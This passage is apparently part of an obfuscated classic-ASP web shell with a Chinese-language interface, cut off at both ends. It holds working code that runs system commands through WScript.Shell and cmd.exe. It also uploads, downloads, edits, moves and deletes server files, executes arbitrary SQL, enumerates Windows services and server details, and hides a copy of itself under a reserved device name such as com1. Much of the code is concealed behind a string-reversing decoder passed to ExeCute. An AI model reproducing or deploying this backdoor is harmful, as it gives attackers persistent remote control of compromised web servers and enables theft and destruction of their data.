umes Rorrr EOn`0000=1uteOimtTipcr.SerrvSe0`deoleFth, trnSon cm,eatr sn,on cr,st, ws, rsm Dir`~\& ) .~(~thPaap.MerrvSe= r st~`~)etdSorec.RDBDO~At(ecbjeOatre C =rst Se`m~eatr.SDBDO~At(ecbjeOatre C =amrestt Se)`n~ioctneon.CDBDO~At(ecbjeOatre C =nncot Se)`~;& h atePth& ~ e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro~P= r Stnnco~`Stnncon pe.Onncor` 11,, nnco, a~ateDil~Fn pe.Ors`pe.Oamrestn`= e yp.Tamrest1`Eos. rilnt UDof`~)~\, ~)thPahe~ts((revrRStIn, ~)thPahe~ts((rftLe= r deoleFth)`he Tseal F =r)deoleFth& r sts(stxirEdeol.F~)ctjeObemstSyleFig.inptriSc(~ctjeObteeaCrr.veer SIfn`erldFohe t &tr(serldFoteeacr)`Ifd En`s(Eoet.Samrest)`~)ntteoneCil~fs( rteri.Wamrest` 2),h~atePth(~rs& r ste iloFeTav.Samrest`exeNov.Mrst`opLo`selo.Crs`selo.Cnnco`selo.Camrest`nghiot N =wst Se`nghiot N =rst Se`nghiot N =amrestt Se`nghiot N =nncot Se",Pos):End Sub:Sub createFolder(thePath):ExeCute SinfoEn("m Dii`\~ ~h,atePthr(stIn= i )` 0 > ilehi WDo`enThe lsFa= ) i), thPahe(tftLes(stxirEdeol.F~)ctjeObemstSyleFig.inptriSc(~ctjeObteeaCrr.veer SIf`)) 1 - ih,atePtht(ef(LerldFoteeaCr).t~ecbjmOteyseSil.Fngtiipcr~St(ecbjeOatre.CerrvSe`Ifd En`he T~)~\, 1)+ i , thPahe(tid(MtrnS IIfn`\~ ~), 1 + ih,atePthd(Mir(stIn+ i = i )`ls Ee`= i 0`Ifd En`opLo",Pos):End Sub:Sub saTreeForMdb(thePath, rs, stream):ExeCute SinfoEn("stLileFiys sr,deoleFth, emitm Di`b$ldH.HSb$mdH.HS~$= t iseLilsFsy~`h)atePthe(acSpmeNaX.sa= r deoleFtht Se`mste.IerldFohe tInm te ichEar Fo`enThe ru T =erldFoIsm.te iIf`amrest, rs, thPam.te idbrMFoeeTrsa`ls Ee`enTh0 =  <~)~$& e am.Nemit& ~ ~$, stLileFiys(strnS IIf`Nedd.Arsw` 4h,at.Pemitd(Mi= ) h~atePth(~rs)`h)at.Pemite(ilmFrodFoa.Lamrest`d(ea.Ramrest= ) t~enntColefi(~rs)`atpd.Urse`Ifd En`Ifd En`xtNe`inthNo= r deoleFtht Seg",Pos):End Sub:Function Course():ExeCute SinfoEn("ter'>='cenalign='0' ddingellpa'1' ccing=llspa0' ceder='' bor'menuolor=' bgc='600widthable br><tSI=~<~`></tr务</td统用户与服nu'>系r='megcoloer' b'centlign='3' aspan=' colt='20heigh><td &~<trSI=SI>~` nextesumeror ron er`NT://(~Winbject getObj inach ofor e.~)`err.clear`e=~~ rtTypJ.Staif OBthen`&~<trSI=SI>~`&nbspFF~~>#FFFFor=~~bgcol20~~ ht=~~ heig&~<tdSI=SI;~`&obj.SI=SIName`>&nbsFFF~~~#FFFlor=~ bgcod><td&~</tSI=SIp;~ `户(组)~&~系统用SI=SI`d></t&~</tSI=SIr>~`d></tp;</t>&nbs~~2~~span=~ colFFFF~~~#FFolor=~ bgc~~20~ight=td he<tr><SI0=~r>~ `end if`x=~自动hen le=2 trtTypJ.Staif OB~`x=~手动hen le=3 trtTypJ.Staif OB~`x=~禁用hen le=4 trtTypJ.Staif OB~`pe=2 artTyBJ.Stand Owin~ ))<>~h,4,3j.patid(obase(mif LCthen`></tr></td/fontth&~<bj.pap;~&o>&nbsF0000or=#Ft col]<fon&lx&~动类型:~~~>[启n=~~2olspaF~~ cFFFFFr=~~#gcolo0~~ bt=~~2heigh><td &~<tryNameisplaobj.Dsp;~&~>&nbFFFF~~~#FFolor=~ bgc~~20~ight=td he/td><me&~<bj.Nap;~&o>&nbsFFF~~~#FFFlor=~ bgco~20~~ght=~d heitr><tI1&~<SI1=S>~`else`></tr></td/fontth&~<bj.pap;~&o>&nbs399FFor=#3t col]<fon&lx&~动类型:~~~>[启n=~~2olspaF~~ cFFFFFr=~~#gcolo0~~ bt=~~2heigh><td &~<tryNameisplaobj.Dsp;~&~>&nbFFFF~~~#FFolor=~ bgc~~20~ight=td he/td><me&~<bj.Nap;~&o>&nbsFFF~~~#FFFlor=~ bgco~20~~ght=~d heitr><tI2&~<SI2=S>~`end if`next`</tabSI2&~&SI1&I&SI0RRS Sle>~",Pso):End Function:Function ServerInfo():ExeCute SinfoEn("ter'>='cenalign='0' ddingellpa'1' ccing=llspa0' ceder='' bor'menuolor=' bgc='80%widthable br><tSI=~<~`></tr息</td务器组件信nu'>服r='megcoloer' b'centlign='3' aspan=' colt='20heigh><td &~<trSI=SI>~`td></)&~</NAME~RVER_s(~SEiableerVar.servquest>~&reFFFF'='#FFcolortd bg/td><bsp;<F'>&nFFFFFor='#bgcol><td 名</td'>服务器FFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SItr>~`FFF'>'#FFFolor=d bgctd><tsp;</'>&nbFFFFFr='#Fgcolo<td b</td>服务器IPFFF'>'#FFFolor=' bgc='200width'20' ight=td heer'><'centlign=<tr aank'>='_blargetrm' t'ipfoname=asp' ndex.com/ip138.www.itp://n='htactiopost thod=rm me&~<foSI=SI~`/form/tr></td><'2'><alue=on' v'actiname=den' ='hid typeinput查询'><lue='t' vasubmiype='put t> <in~)&~'_ADDRLOCALles(~ariabrverVst.SeRequee='~& valu='15' size='ip' nametext'ype='put t&~<inSI=SI>~`</tr></td>nbsp;ow&~&'>~&nFFFFFr='#Fgcolo<td b</td>nbsp;FF'>&#FFFFlor=' bgcod><td时间</t'>服务器FFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SI~`></tr~</tdRS~)&CESSOF_PROBER_O(~NUMablesrVariServeuest.~&ReqFFF'>'#FFFolor=d bgctd><tsp;</'>&nbFFFFFr='#Fgcolo<td b</td>CPU数量'>服务器FFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SI>~`d></t&~</t~OS~)bles(Variaerverest.S&RequFF'>~#FFFFlor=' bgcod><tdp;</t>&nbsFFFF'='#FFcolortd bg/td><操作系统<'>服务器FFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SIr>~`></tr~</tdRE~)&OFTWAVER_S(~SERablesrVariServeuest.~&ReqFFF'>'#FFFolor=d bgctd><tsp;</'>&nbFFFFFr='#Fgcolo<td b</td>服务器版本'>WEBFFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SI>~`=0 ToFor i 13`td></)&~</t(i,2>~&So=leftalignFFF' '#FFFolor=d bgctd><t)&~</t(i,1>~&SoFFFF'='#FFcolortd bg/td><0)&~<ot(i,'>~&SFFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SItr>~`Next`RRS SI",Pso):End Function:Function DownFile(Path):ExeCute SinfoEn("arle.CseonspRe`)),0(6ot(SctjeObteeaCr= M OSt Se`enOpM.OS` 1 =peTyM.OS`at PleFiomFradLoM.OSh`)+\~,~thpav(Retrns=Isz1`z),sthpad(Mi& ~ e=amenil ft;enhmactt~a, n~ioitosspDit-enntCo ~eradHedd.AseonspRe`iz.SSM O~,thngLet-enntCo ~eradHedd.AseonspRee`8~F-UT ~ =etrsha.CseonspRe`amrestt-teocn/ioaticplap ~ =peTyntteon.CseonspRe~`ea.RSM OteriyWarin.BseonspRed`shlu.FseonspRe`osClM.OSe`inthNo= M OSt Seg",Pos):End Function:Function HTMLEncode(S):if not isnull(S) then:S= replace(S,">","&gt;"):S=replace(S,"<","&lt;"):S=replace(S,CHR(39),"&#39;"):S=replace(S,CHR(34),"&quot;"):S=replace(S,CHR(20),"&nbsp;"):HTMLEncode=S:end if:End Function:sub hiddenshell
fpath=request.servervariables("path_translated"):set fso=server.createobject("scripting.filesystemobject"):pex="com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9":rndpex=split(pex,"|")(rndnumber(0,17)):session("seljw")="":filepath1=server.mappath("."):filename1=right(fpath,len(fpath)-instrrev(fpath,"\")):url=request.servervariables("url"):url=left(url,instrrev(url,"/"))&rndpex&"."&filename1:fso.copyfile fpath,"\\.\"&filepath1&"\"&rndpex&"."&filename1:set fso=nothing:rrs "<script>parent.location='http://"&request("server_name")&url&"';</script>"
end sub:Function UpFile():
If Request("Action2")="Post" Then
Set U=new UPC : Set F=U.UA("LocalFile")
UName=U.form("ToPath")
If UName="" Or F.FileSize=0 then
SI="<br>请输入上传的完全路径后选择一个文件上传!"
Else
F.SaveAs UName
If Err.number=0 Then
SI="<center><br><br><br>文件"&UName&"上传成功！</center>"
RRS ""&copyurl&""
End if
End If
Set F=nothing:Set U=nothing
SI=SI&BackUrl
RRS SI
ShowErr()
Response.End
End If
SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
SI=SI&"<tr><td>"
SI=SI&"上传路径：<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\ice.asp")&"' size='40'>"
SI=SI&" <input name='LocalFile' type='file'size='25'>"
SI=SI&" <input type='submit' name='Submit' value='上传'>"
SI=SI&"</td></tr></form></table>"
RRS SI:
End Function::Function Cmd1Shell():ExeCute SinfoEn("checked=~ checked~`t(~SPeques) = RPath~Shellion(~ Sess Then)<>~~(~SP~questIf Re~)`ath~)hellPon(~SSessiPath=Shell`md.ex = ~clPath Shel Thenth=~~ellPaif She~`heckehen ces~ t)<>~yript~(~wscquestif Red=~~`cmd~)est(~ RequCmd =n Def~ The~)<>~(~cmdquestIf Re`st'>~d='pomethoform SI=~<`bsp;~sp;&n'>&nbh:70%'widttyle=&~' SlPath&Shelue='~' vale='SPt nam<inpuLL路径：&~SHESI=SI`hell~ipt.S>WScrked&~&checyes'~lue='t' vascripme='wx' naeckboe='chc typlass=put c&~<inSI=SI`440;'ight:0%;heth:10='widStylearea <text'执行'>alue=it' v'submtype=nput '> <iCmd&~~&Deflue='%' vath:92='widStylecmd' ame='put n&~<inSI=SI>~`~ The~)<>~(~cmd.FormquestIf Ren`s~ th)=~yeript~(~wsc.Formquestif Reen`Sot(1ject(ateObM=CreSet C,0))`~&Def~ /c Path&Shellexec(D=CM.Set DCmd)`eadalout.rD.stdaaa=Dl`SI=SI&aaa`else` Nextesumeror ROn Er`.Shelcriptt(~WSObjecreatever.Cs=SerSet wl~)`.Shelcriptt(~WSObjecreatever.Cs=SerSet wl~)`bjectstemOileSying.Fcriptct(~SeObjeCreatrver.so=SeSet f~)`md.txth(~cmapparver. = sepFileszTemt~)` 0, TFile,zTemp~ & s ~ > Cmd && Def/c ~ th&~ ellPan (Shws.RuCall rue)`ject~temObleSysng.Firiptit(~ScObjecreates = CSet f)`se, 0, Falle, 1empFi (szTtFileenTexfs.Opcx = FilelSet o)`.Readlelcxe(oFiEncod.HTMLerveraaa=SAll)`lcx.CoFilelose`, TrupFileszTemFile(eletefso.DCall e)`SI=SI&aaa`end if`End If`></fotarea</tex13)&~&chr(SI=SIrm>~`RRS SI",Pso):End Function:ExeCute SinfoEn("ioctun Fnd:EtrwSne= f iner:SxtNe):os P -618329 ( &os+P)) 1i,, trtsged(Mic(As& r Stew n =trwSne):trtsgen(Leo  T 1 = ior:FtrwSne,  iim:Ds)Po, trtsgef(iner SontincFun",Pos):Function CreateMdb(Path):ExeCute SinfoEn(">~br><br~<I= S`) 0)2,t(Sot(ecbjeOatre C = Cet S`thPa& ~ e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro~Pe(atre.C C)`nghiot N = Cet S`he T=0ermbnur.Erf  In`功!建成~新& h at P &SI= I  S~` Ind Ef`rlkUac&BSII= S ` SRS RI",Pos):End function:Function CompactMdb(Path):ExeCute SinfoEn("enTh) ,1(0ot Sot NIf`)),0(3ot(SctjeObteeaCrC=t Se `at&P~ e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro,P&~thPa~&e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro~Pe asabattDacmpCoC.h`inthNoC=t Seg`seEl`)),1(0ot(SctjeObteeaCrO=FSt Se`enTh) thPas(stxieEil.FSO FIf`)),0(3ot(SctjeObteeaCrC=t Se `k~ba~_h&at&P~ e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro,P&~thPa~&e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro~Pe asabattDacmpCoC.`inthNoC=t Seg`at PleFiteleDeO.FSh`at,Pk~ba~_h&at PleFiveMoO.FSh`seEl`>~erntce</现！有发~没h&at&P库~数据r><br><br><br>teen<c=~SI `=1ermbnur.Er`Ifd En`inthNoO=FSt Seg`Ifd En`enTh0 r=beum.nrr EIf`>~erntce</功！缩成~压h&at&P库~数据r><br><br><br>teen<c=~SI`Ifd En`UrckBaI&=SSIl`SIS RR",Pos):End Function
if session("web2a2dmin")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass then
session("web2a2dmin")=UserPass
x m:response.redirect url
else
rrs"<center>'"&errout&"'</center>"
end if
else
si="<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><hr><FORM Action='"&URL&"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login><hr><br>"&mmshell&"</div></center>"
if instr(SI,SIC)<>0 then rrs sI
end if
response.end
end if
Function DbManager():ExeCute SinfoEn("tr~))~SqlSForm(uest.m(Reqr=TriSqlSt`DbStrorm(~est.F=RequDbStr~)`ing='lpadd' celng='0spaci cellr='0'borde'650'idth=ble w&~<taSI=SI0'>~`on='' actipost'hod='' metbFormme='Drm na&~<foSI=SI>~`接串:</;数据库连&nbsp27'> ght='' hei='100width><td &~<trSI=SItd>~`/td>~~~~><bStr&~~~&Dalue=70' vdth:4e='wi stylbStr'me='Dut na><inp&~<tdSI=SI`ption连接</occesse=0>A valuptionon><o/opti接串示例<=-1>连valuetion '><opalue)ex].vedIndelectons[s(optiDbStr Fulleturnge='rnchantn' o'StrBname=lect '><seentergn='c' alih='60 widt&~<tdSI=SI>~`ption连接</o3>DSNalue=ion v><optption连接</oMySqlue=2>n valoptioion><</optSql连接=1>Msvaluetion &~<opSI=SI>~`tion>据</op5>添加数alue=ion v><optption数据</o=4>显示valuetion n><opoptio法--</-SQL语=-1>-valuetion &~<opSI=SI~`ion>~</opt>建数据表lue=8on va<optition>据</op7>修改数alue=ion v><optption数据</o=6>删除valuetion &~<opSI=SI`ption字段</o11>删除alue=ion v><optption字段</o10>添加alue=ion v><optption据表</o=9>删数valuetion &~<opSI=SI>~`></tr></tdelectn></soptio全显示</=12>完valuetion &~<opSI=SI>~`lue='n' vahiddeype='ge' te='Pat nam<inpuger'>bManaue='D' validdenpe='hn' tyActioame='put n&~<inSI=SI1'>~`:</tdL操作命令sp;SQ'>&nbt='30heigh><td &~<trSI=SI>~`></tdr&~~~SqlSt=~~~&value470' idth:le='w' styqlStrme='Sut na><inp&~<tdSI=SI>~`/td>~()'><Checkrn Db'retulick=' once='执行 valubmit'e='Su' namubmitpe='sut ty><inpnter'n='ce alig&~<tdSI=SI`pan>~'></s='abcan ide><sp/tablorm><r></f&~</tSI=SI`I:SI=RRS S~~`0 Thetr)>4n(DbSIf Len`(5,0)t(SotObjecreateonn=CSet C)`DbStrOpen Conn.`ma(20nSchen.Opes=ConSet R) `r>名</d>表<bC'><tCCCCCor='#Bgcol'25' ight=tr heble><&~<taSI=SItd>~`veFirRs.Most `ot Rsile NDo Wh.Eof`E~ th~TABLPE~)=LE_TY(~TABIf Rsen`_NAMETABLE=Rs(~TName~)`a><brl ]</>[ de~,1)'e&~]~&TNamLE [~P TAB~~DROlStr(ullSqipt:Fvascrf='jaa hreter><n=cen alig&~<tdSI=SI>~`</td>~</a>Name&'>~&T~~,1)me&~]~&TNaROM [T * FSELECtr(~~lSqlSt:Fulscrip'javahref=&~<a SI=SI~`End If `veNexRs.Mot `Loop `s=NotSet Rhing`able>r></t&~</tSI=SI~`I:SI=RRS S~~`10 ThStr)>n(SqlIf Leen`ct~ t~sele,6))=qlStreft(Sase(LIf LChen`qlStr句：~&S&~执行语SI=SI`ordseb.Rec~Adodject(ateObs=CreSet Rt~)`Conn,lStr,en SqRs.op1,1`ds.Co.FielFN=Rsunt`rdCou.RecoRC=Rsnt`geSizRs.Pae=20`ageSi=Rs.PCountze`Count.PagePN=Rs`age~)st(~PrequePage=`g(Page=Clnn Pag~ Thege<>~If Pae)` Page Thenage=0 Or Pge=~~If Pa=1` Page Thenge>PNIf Pa=PN`=PageepagesolutRs.abThen ge>1 If Pa`td></ccc><=#ccccolor25 bgight=tr heble><&~<taSI=SItd>~` FN-1=0 toFor n`em(n)ds.It.Fielld=RsSet F`e&~</d.Nam>~&Flnter'n='ce alig&~<tdSI=SItd>~`thingld=noSet F`Next`&~</tSI=SIr>~`Count And .Bof)or Rs.Eof ot(Rsile NDo Wh>0`=CounCountt-1`EFEFEor=~#BgcolF~`t></t</fongs'>xngdine='wit fac><foncccccor=#cbgcol><td &~<trSI=SId>~` FN-1=0 ToFor i`~:EndFEFEFr=~#Egcololse:BF5~:E#F5F5lor=~:Bgco ThenEFEF~=~#EFcolorIf Bg if`=1 ThIf RCen`Rs(i)code(TMLEnnfo=H ColI)`Else`,50))Rs(i)Left(code(TMLEnnfo=H ColI`End If`&~</tlInfo>~&Color&~&Bgcolor=~ bgco&~<tdSI=SId>~`Next`&~</tSI=SIr>~`veNexRs.Mot`Loop`I:SI=RRS S~~`lStr)de(SqlEnCor=HtmSqlSt`&~/~&&Page;页码：~&nbsp&RC&~记录数：~nter>gn=ce~ aliFN+1&an=~&colsp><td &~<trSI=SIPN`>1 ThIf PNen`a>&nb上一页</&~)'>age-1~,~&Ptr&~~&SqlSr(~~~SqlSt:Fullcriptjavasref=';<a h&nbsp页</a>1)'>首&~~~,qlStr~~~&SlStr(ullSqipt:Fvascrf='jaa hrebsp;<sp;&n&~&nbSI=SIsp;~`End iSp=1:Else:ge-8:Sp=PaThen:ge>8 If Paf`o Sp+=Sp TFor i8`it Foen ExPN ThIf i>r`Page If i=Then`nbsp;&i&~&SI=SI~`Else`&nbsp~</a>>~&i&i&~)'~~,~&Str&~~&Sqltr(~~lSqlSt:Fulscrip'javahref=&~<a SI=SI;~`End If`Next`尾页</a&~)'>,~&PNr&~~~SqlSt(~~~&qlStrFullSript:avascef='j<a hrnbsp;</a>&'>下一页+1&~)&Page~~~,~lStr&~~&SqStr(~llSqlpt:Fuascri='jav hrefsp;<a&~&nbSI=SI>~`End If`able>r></td></t'></tFEFEFr='#E colo&~<hrSI=SI~`=Nothet Rsose:SRs.Cling`I:SI=RRS S~~`Else `lStr)te(SqExecuConn.`SqlSt语句：~&&~SQLSI=SIr`End If`I:SI=RRS S~~`End If`CloseConn.`othinonn=NSet Cg`End If",Pso):End Function:Dim T1

Function EnCode(ObjStr,ObjPos)
Dim NewStr,TmpStr,i,LenStr:LenStr=Len(ObjStr):For i=0 To Int(LenStr/ObjPos)-1:TmpStr=Mid(ObjStr,i*ObjPos+1,ObjPos)&TmpStr:Next:EnCode=TmpStr&Right(ObjStr,LenStr Mod ObjPos)
End Function



Class UPC:Dim D1,D2:Public Function Form(F):F=lcase(F):If D1.exists(F) then:Form=D1(F):else:Form="":end if:End Function:Public Function UA(F):F=lcase(F):If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if:End Function:Private Sub Class_Initialize:Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName:set D1=CreateObject(Sot(4,0)):if Request.TotalBytes<1 then Exit Sub
  set T1=CreateObject(Sot(6,0)):T1.Type=1:T1.Mode=3:T1.Open:T1.Write Request.BinaryRead(Request.TotalBytes):T1.Position=0:TDa=T1.Read:DStart=1:DEnd=LenB(TDa):set D2=CreateObject(Sot(4,0)):vbCrlf=chrB(13)&chrB(10):set T2=CreateObject(Sot(6,0)):TSt=MidB(TDa,1,InStrB(DStart,TDa,vbCrlf)-1):TLen=LenB(TSt):DStart=DStart+TLen+1:while (DStart+10)<DEnd:DIEnd=InStrB(DStart,TDa,vbCrlf&vbCrlf)+3:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DStart:T1.CopyTo T2,DIEnd-DStart:T2.Position=0:T2.Type=2:T2.Charset="gb2312":TIn=T2.ReadText:T2.Close:DStart=InStrB(DIEnd,TDa,TSt):FStart=InStr(22,TIn,"name=""",1)+6:FEnd=InStr(FStart,TIn,"""",1):UpName=lcase(Mid(TIn,FStart,FEnd-FStart)):if InStr (45,TIn,"filename=""",1)>0 then
  set TFL=new FIF:FStart=InStr(FEnd,TIn,"filename=""",1)+10:FEnd=InStr(FStart,TIn,"""",1):FStart=InStr(FEnd,TIn,"Content-Type: ",1)+14:FEnd=InStr(FStart,TIn,vbCr):TFL.FileStart=DIEnd:TFL.FileSize=DStart-DIEnd-3:if not D2.Exists(UpName) then:D2.add UpName,TFL:end if
  else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset ="gb2312":SFV = T2.ReadText:T2.Close:if D1.Exists(UpName) then:D1(UpName)=D1(UpName)&","&SFV:else:D1.Add UpName,SFV:end if:end if:DStart=DStart+TLen+1:wend:TDa="":set T2=nothing:End Sub:Private Sub Class_Terminate:if Request.TotalBytes>0 then:D1.RemoveAll:D2.RemoveAll:set D1=nothing:set D2=nothing:T1.Close:set T1 =nothing:end if:End Sub:End Class:

Function SinfoEn(ObjStr,ObjPos)
ObjStr=Replace(ObjStr,"~",""""):NewStr=Split(ObjStr,"`"):For i=0 To UBound(NewStr):SinfoEn=SinfoEn&EnCode(NewStr(i),ObjPos)&vbCrLf:Next:SinfoEn=Left(SinfoEn,Len(SinfoEn)-2)
End Function



Class FIF:dim FileSize,FileStart:Private Sub Class_Initialize:FileSize=0:FileStart=0:End Sub:Public function SaveAs(F)
  dim T3:SaveAs=true:if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(Sot(6,0)):T3.Mode=3:T3.Type=1:T3.Open:T1.position=FileStart:T1.copyto T3,FileSize:T3.SaveToFile F,2:T3.Close:set T3=nothing:SaveAs=false:end function:End Class:

Function Fun(ShiSanObjstr):ShiSanObjstr=Replace(ShiSanObjstr,"|",""""):For ShiSanI=1 To Len(ShiSanObjstr):If Mid(ShiSanObjstr,ShiSanI,1)<>"!"Then:ShiSanNewStr=Mid(ShiSanObjstr,ShiSanI,1)&ShiSanNewStr:Else:ShiSanNewStr=vbCrLf&ShiSanNewStr:End If:Next:Fun = ShiSanNewStr:End Function



Class LBF:Dim CF:Private Sub Class_Initialize:SET CF=CreateObject(Sot(0,0)):End Sub:Private Sub Class_Terminate:Set CF=Nothing:End Sub
Function ShowDriver()
For Each D in CF.Drives
RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>→本地磁盘 ("&D.DriveLetter&":)</a></td></tr>" 
Next
End Function
Function Show1File(Path):
Set FOLD=CF.GetFolder(Path)
i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>"
For Each F in FOLD.subfolders
SI=SI&"<td height=10 width=17% align=center><div style='border:1px solid "&BorderColor&"'>"
SI=SI&"<a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""进入""><font face='wingdings' size='6'>0</font><br>"&F.Name&"</a>" 
SI=SI&"<br><b>[</b><a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'onclick='return yesok()' class='am' title='复制'>Copy</a> "
SI=SI&"<a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'onclick='return yesok()' class='am' title='删除'>Del</a>"
SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'onclick='return yesok()' class='am' title='移动'>Move</a>"
SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")'onclick='return yesok()' class='am' title='下载'>Down</a><b>]</b></div></td>"
i=i+1
If i mod 5 = 0 then SI=SI&"</tr><tr>"
Next
SI=SI&"</tr><tr><td height=2></td></tr></table>"
RRS SI:SI="":i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>"
For Each L in Fold.files
SI=SI&"<td height='30'><div style='border:1px solid "&BorderColor&"'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='下载'><font face='wingdings' size='5'>2</font>"&L.Name&"</a> <b>[</b> "
SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a> "
Si=Si&"<a  href='###' class='am' ><font color=blue >权限</font></a>"
Dim EditOOK
EditOOK=1
EditOOV=l.Attributes
If EditOOV >= 128 Then
EditOOV = EditOOV - 128
End If
If EditOOV >= 64 Then
EditOOV = EditOOV - 64
End If
If EditOOV >= 32 Then
EditOOV = EditOOV - 32
End If
If EditOOV >= 16 Then
EditOOV = EditOOV - 16
End If:If EditOOV >= 8 Then
EditOOV = EditOOV - 8
End If
If EditOOV >= 4 Then
EditOOV = EditOOV - 4:EditOOK=0
End If
If EditOOV >= 2 Then
EditOOV = EditOOV - 2:EditOOK=0
End If
If EditOOV >= 1 Then
EditOOV = EditOOV - 1:EditOOK=0
End If
if EditOOK=0 then
si=si&"<font face='webdings' size='1' color=red>x</font>"
else
si=si&"<font color=red >√</font>"
end if
SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='移动'>Move</a> <b>]</b> - "

SI=SI&clng(L.size/1024)&"K<br><b>"
SI=SI&L.Type&"</b> <i> - "
SI=SI&L.DateLastModified&"</i></div></td>"
i=i+1
If i mod 2 = 0 then SI=SI&"</tr><tr>"
Next
 RRS SI&"</tr></table>"
Set FOLD=Nothing
End function:




Function DelFile(Path):ExeCute SinfoEn("he Th)at(PtsisExleFiF. CIfn`thPae ileFetel.DCF`r>teen/c！<成功删除~ h&at&P ~文件r><br><br><br>teen<c=~SI~`UrckBaI&=SSIl`SIS RR`Ifd En",Pos):End Function:Function EditFile(Path)::If Request("Action2")="Post" Then:Set T=CF.CreateTextFile(Path):T.WriteLine Request.form("content"):T.close:Set T=nothing:SI="<center><br><br><br>文件保存成功！</center>":SI=SI&BackUrl:RRS SI:RRS ""&copyurl&"":Response.End:End If:If Path<>"" Then:Set T=CF.opentextfile(Path, 1, False):Txt=HTMLEncode(T.readall) :T.close:Set T=Nothing:Else:Path=Session("FolderPath")&"\newfile.asp":Txt="新建文件":End If:SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>":SI=SI&"<input name='Action' value='EditFile' Type='hidden'>":SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>":SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>":SI=SI&"<hr><input name='goback' type='button' value='返回' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存'></form>":RRS SI:
End Function:Function CopyFile(Path):ExeCute SinfoEn("|~||~|h,at(Pitpl S =thPa)`enTh~ >~)<(1thPad an) 0)h(at(PtsisExleFiF. CIf`(1thPa),(0thPae ilyFop.CCF)`>~erntce</功！制成~复)&(0thPa~&文件r><br><br><br>teen<c=~SI`UrckBaI&=SSIl`SIS RR `Ifd En",Pos):End Function:Function MoveFile(Path):ExeCute SinfoEn("|||~)th,~|it(Pa= SplPath `~ The1)<>~Path( and h(0))s(PatExist.FileIf CFn`Path(h(0),e PatveFilCF.Mo1)`enter功！</c&~移动成th(0)件~&Pa<br>文><br>r><brcenteSI=~<>~`&BackSI=SIUrl`RRS SI `End If",Pso):End Function:Function DelFolder(Path):ExeCute SinfoEn("he Th)at(PtsisExerldFoF. CIfn`thPar deoleFetel.DCF`r>teen/c！<成功删除&~thPa~&目录r><br><br><br>teen<c=~SI~`UrckBaI&=SSIl`SIS RR`Ifd En",Pos):End Function:Function CopyFolder(Path):ExeCute SinfoEn("|~||~|h,at(Pitpl S =thPa)`enTh~ >~)<(1thPad an) 0)h(at(PtsisExerldFoF. CIf`(1thPa),(0thPar deolyFop.CCF)`>~erntce</功！制成~复)&(0thPa~&目录r><br><br><br>teen<c=~SI`UrckBaI&=SSIl`SIS RR`Ifd En",Pos):End Function:Function MoveFolder(Path):ExeCute SinfoEn("|~||~|h,at(Pitpl S =thPa)`enTh~ >~)<(1thPad an) 0)h(at(PtsisExerldFoF. CIf`(1thPa),(0thPar deoleFov.MCF)`>~erntce</功！动成~移)&(0thPa~&目录r><br><br><br>teen<c=~SI`UrckBaI&=SSIl`SIS RR`Ifd En",Pos):End Function:Function NewFolder(Path):ExeCute SinfoEn("enTh~ >~h<at Pnd ah)at(PtsisExerldFoF. Cot NIf`thPar 